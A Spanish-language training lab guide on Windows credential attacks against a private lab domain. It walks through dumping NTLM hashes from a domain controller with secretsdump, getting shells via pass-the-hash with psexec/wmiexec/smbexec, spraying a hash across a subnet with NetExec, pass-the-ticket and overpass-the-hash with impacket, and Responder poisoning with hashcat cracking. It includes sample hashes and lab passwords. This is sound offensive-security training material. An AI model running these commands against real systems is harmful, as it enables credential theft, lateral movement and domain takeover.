# Lab 03 — Pass-the-Hash & Pass-the-Ticket

## Objetivo

Autenticarse en sistemas Windows usando hashes NTLM o tickets Kerberos sin necesidad de conocer la contraseña en texto plano.

---

## Pass-the-Hash (PtH)

Windows acepta el hash NTLM directamente para autenticar. No es necesario crackear el hash.

```
Flujo normal:  Usuario → contraseña → hash NTLM → autenticación
PtH:           Atacante → hash robado directamente → autenticación
```

### Obtener hashes NTLM

```bash
# Si tenemos acceso al DC (como Domain Admin):
secretsdump.py labthinktank.local/Administrator:Lab@Think2026!@192.168.100.10

# Output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
# jgarcia:1108:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
# mlopez:1109:aad3b435b51404eeaad3b435b51404ee:92937945b518814341de3f726500d4ff:::

# Formato: usuario:RID:LM_hash:NT_hash:::
# El NT hash (segundo) es el que se usa para PtH
```

### Usar el hash para autenticarse

```bash
# psexec con hash NTLM — obtener shell
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe \
    Administrator@192.168.100.10

# wmiexec con hash
wmiexec.py -hashes :2b576acbe6bcfda7294d6bd18041b8fe \
    Administrator@192.168.100.10

# smbexec con hash
smbexec.py -hashes :2b576acbe6bcfda7294d6bd18041b8fe \
    Administrator@192.168.100.10

# NetExec — PtH en toda la red
nxc smb 192.168.100.10 \
    -u Administrator \
    -H 2b576acbe6bcfda7294d6bd18041b8fe

# Buscar dónde funciona el hash (múltiples targets)
nxc smb 192.168.100.0/24 \
    -u Administrator \
    -H 2b576acbe6bcfda7294d6bd18041b8fe \
    --continue-on-success
```

---

## Pass-the-Ticket (PtT)

En lugar del hash, se roba un ticket Kerberos válido (TGT o TGS) y se inyecta en la sesión del atacante.

### Solicitar un TGT con credenciales

```bash
# Obtener TGT y guardar como .ccache
getTGT.py labthinktank.local/jgarcia:Password123! \
    -dc-ip 192.168.100.10

# Se genera: jgarcia.ccache

# Exportar para usarlo con impacket
export KRB5CCNAME=/workspace/jgarcia.ccache

# Verificar el ticket
klist
```

### Usar el ticket (sin contraseña)

```bash
# Con el KRB5CCNAME exportado:
smbclient.py -k -no-pass labthinktank.local/jgarcia@192.168.100.10

# psexec con ticket
psexec.py -k -no-pass jgarcia@DC01.labthinktank.local

# secretsdump con ticket (si el usuario tiene permisos)
secretsdump.py -k -no-pass DC01.labthinktank.local
```

### Sobrepasar restricciones con ticket de Domain Admin

```bash
# 1. Obtener TGT del admin
getTGT.py labthinktank.local/Administrator:Lab@Think2026! \
    -dc-ip 192.168.100.10 \
    -o Administrator.ccache

# 2. Exportar
export KRB5CCNAME=/workspace/Administrator.ccache

# 3. Conectarse al DC con el ticket
wmiexec.py -k -no-pass Administrator@DC01.labthinktank.local
```

---

## Overpass-the-Hash

Convierte un hash NTLM en un TGT Kerberos, evitando el tráfico NTLM (más sigiloso):

```bash
# Obtener TGT usando el hash (no la contraseña)
getTGT.py labthinktank.local/Administrator \
    -hashes :2b576acbe6bcfda7294d6bd18041b8fe \
    -dc-ip 192.168.100.10

export KRB5CCNAME=/workspace/Administrator.ccache

# Ahora usar Kerberos en vez de NTLM
psexec.py -k -no-pass Administrator@DC01.labthinktank.local
```

---

## Capturar hashes con Responder

Responder captura hashes NTLMv2 cuando un equipo intenta autenticarse contra un recurso inexistente:

```bash
# Levantar Responder en modo escucha (desde ad-tools)
python3 /opt/Responder/Responder.py -I eth0 -wF

# Cuando un cliente intenta acceder a //servidor-inexistente/share:
# Responder captura el hash NTLMv2

# Crackear el hash NTLMv2 capturado
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Actividades

1. Ejecutar `secretsdump` contra el DC y extraer todos los hashes NTLM
2. Usar PtH con el hash de `Administrator` para obtener shell en el DC
3. Usar PtH con `nxc` para verificar en qué hosts funciona el hash
4. Obtener un TGT de `sql_svc` y usarlo para conectarse al DC
5. Explicar la diferencia entre PtH (NTLM) y PtT (Kerberos) en términos de detección

---

## Mapeo MITRE ATT&CK

| Técnica | TTP |
|---------|-----|
| Pass the Hash | T1550.002 |
| Pass the Ticket | T1550.003 |
| LLMNR/NTR Poisoning (Responder) | T1557.001 |
| OS Credential Dumping — NTDS | T1003.003 |
